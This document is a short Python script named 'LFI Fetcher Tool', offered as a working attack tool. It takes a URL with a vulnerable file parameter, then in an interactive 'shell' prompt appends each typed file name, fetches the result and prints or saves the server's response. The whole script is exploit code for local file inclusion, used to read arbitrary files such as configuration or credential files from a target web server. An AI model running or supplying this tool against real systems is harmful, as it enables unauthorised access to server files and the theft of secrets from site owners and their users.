import argparse
import requests
import sys
import readline

import os
history_file = os.path.expanduser("./.lfi_history")
if os.path.exists(history_file):
    readline.read_history_file(history_file)

def main():
    parser = argparse.ArgumentParser(
        description="LFI Fetcher Tool",
        epilog="Example: python3 tool.py 'http://site.com/index.php?file=' -v"
    )
    parser.add_argument("url", help="The base URL with the vulnerable parameter (e.g., 'http://site.com/page.php?file=')")
    
    parser.add_argument("-v", "--verbose", action="store_true", help="Show extra connection details")
    
    parser.add_argument("-o", "--output", help="Save the output to a local file")

    args = parser.parse_args()

    print(f"[*] Targeting: {args.url}")
    
    try:
        while True:
            filename = input("shell >>> ")
            if filename.lower() in ['exit', 'quit']: break

            readline.set_history_length(100)
            readline.write_history_file(history_file)
            target_url = f"{args.url}{filename}"
            
            if args.verbose:
                print(f"[DEBUG] Fetching: {target_url}")

            response = requests.get(target_url)
            
            if response.status_code == 200:
                print(response.text)
                
                if args.output:
                    with open(args.output, "a") as f:
                        f.write(f"\n--- Content of {filename} ---\n")
                        f.write(response.text)
            else:
                print(f"[!] Error: Server returned status {response.status_code}")

    except KeyboardInterrupt:
        print("\n[!] User exited.")

if __name__ == "__main__":
    main()